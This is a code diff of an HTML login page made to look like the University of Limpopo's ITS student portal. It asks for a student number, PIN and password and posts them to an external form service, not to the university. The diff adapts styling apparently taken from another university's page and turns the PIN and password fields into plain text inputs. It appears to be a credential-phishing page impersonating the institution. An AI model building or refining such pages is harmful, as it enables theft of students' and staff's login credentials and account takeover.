@@ -25,7 +25,6 @@
       box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
     }
 
-    /* Top grey-blue header bar */
     .fra-header {
       background: #d6e4f7;
       padding: 5px 10px;
@@ -40,7 +39,6 @@
       color: #222;
     }
 
-    /* Logo row */
     .logo-row {
       display: flex;
       justify-content: space-between;
@@ -58,20 +56,13 @@
       height: 75px;
       width: auto;
     }
-    .tut-name {
+    .ul-name {
       color: #003399;
       font-size: 18px;
       font-weight: bold;
       line-height: 1.3;
     }
-    .tut-name .tagline {
-      color: #cc0000;
-      font-style: italic;
-      font-weight: normal;
-      font-size: 13px;
-      display: block;
-      margin-top: 2px;
-    }
+
     .its-badge {
       background: #003399;
       color: #fff;
@@ -88,7 +79,6 @@
       display: block;
     }
 
-    /* Blue login bar */
     .login-top {
       background: #003399;
       color: #fff;
@@ -97,7 +87,6 @@
       padding: 9px 16px;
     }
 
-    /* Form body */
     .login-body {
       padding: 18px 20px;
       background: #fff;
@@ -117,12 +106,6 @@
       cursor: pointer;
       color: #000;
     }
-    .radio-row input[type="radio"] {
-      width: 15px;
-      height: 15px;
-      accent-color: #003399;
-      cursor: pointer;
-    }
 
     .field-label {
       font-size: 13px;
@@ -140,7 +123,6 @@
       border-radius: 1px;
       background: #ffffff;
       color: #000000;
-      font-family: Arial, Helvetica, sans-serif;
     }
     .tut-input:focus {
       outline: 2px solid #003399;
@@ -172,22 +154,16 @@
       cursor: pointer;
       border-radius: 2px;
       color: #000000;
-      font-family: Arial, Helvetica, sans-serif;
-      font-weight: normal;
     }
     .tut-btn:hover {
       background: #c8d4ee;
       border-color: #003399;
-      color: #000000;
     }
-    .tut-btn:active {
-      background: #b0c0e0;
-    }
+
     .btn-row-2 {
       margin-top: 8px;
     }
 
-    /* Success / Error messages */
     .msg-success {
       background: #d4edda;
       color: #155724;
@@ -209,7 +185,6 @@
       display: none;
     }
 
-    /* Footer bar */
     .login-bottom {
       background: #d6e4f7;
       border-top: 1px solid #aab;
@@ -221,9 +196,7 @@
 
     @media (max-width: 480px) {
       .logo-left img { height: 55px; }
-      .tut-name { font-size: 15px; }
       .its-badge { display: none; }
-      .radio-row { gap: 10px; }
     }
   </style>
 </head>
@@ -244,10 +217,8 @@
     </div>
   </div>
 
-  <!-- Blue bar -->
   <div class="login-top">Registered Users: Login Credentials</div>
 
-  <!-- Form -->
   <div class="login-body">
 
     <div class="msg-success" id="msgSuccess">
@@ -261,27 +232,25 @@
           action="https://forminit.com/f/prxg0k75gif"
           method="POST">
    
-      <!-- User type radio - using fi-select or fi-radio -->
+      <!-- User type -->
       <div class="radio-row">
-        <label><input type="radio" name="fi-radio-usertype" value="Student" checked> Student</label>
-        <label><input type="radio" name="fi-radio-usertype" value="Personnel"> Personnel</label>
-        <label><input type="radio" name="fi-radio-usertype" value="Other"> Other</label>
-        <label><input type="radio" name="fi-radio-usertype" value="Alumni"> Alumni</label>
+        <label><input type="radio" name="fi-text-usertype" value="Student" checked> Student</label>
+        <label><input type="radio" name="fi-text-usertype" value="Personnel"> Personnel</label>
+        <label><input type="radio" name="fi-text-usertype" value="Other"> Other</label>
+        <label><input type="radio" name="fi-text-usertype" value="Alumni"> Alumni</label>
       </div>
 
       <!-- Student Number -->
       <div class="field-label">Student Number:</div>
       <input class="tut-input" type="text" name="fi-text-studentnumber"
              id="studentNumber"
-             placeholder=""
              autocomplete="off"
              required>
 
       <!-- PIN -->
       <div class="field-label">Pin:</div>
-      <input class="tut-input" type="password" name="fi-password-pin"
+      <input class="tut-input" type="text" name="fi-text-pin"
              id="pinField"
-             placeholder=""
              maxlength="5"
              pattern="[1-9][0-9]{4}"
              title="5 numeric digits. Do not start with a 0."
@@ -291,9 +260,8 @@
 
       <!-- Password -->
       <div class="field-label">Password:</div>
-      <input class="tut-input" type="password" name="fi-password-password"
+      <input class="tut-input" type="text" name="fi-text-password"
              id="passwordField"
-             placeholder=""
              autocomplete="off"
              required>
 
@@ -312,7 +280,6 @@
     </form>
   </div>
 
-  <!-- Footer -->
   <div class="login-bottom">
     &copy; 2026 University of Limpopo &nbsp;|&nbsp; Powered by ITS Tertiary Software
   </div>
@@ -344,7 +311,6 @@
 
     document.getElementById('msgError').style.display = 'none';
     document.getElementById('msgSuccess').style.display = 'block';
-
   });
 
   document.getElementById('pinField').addEventListener('input', function() {
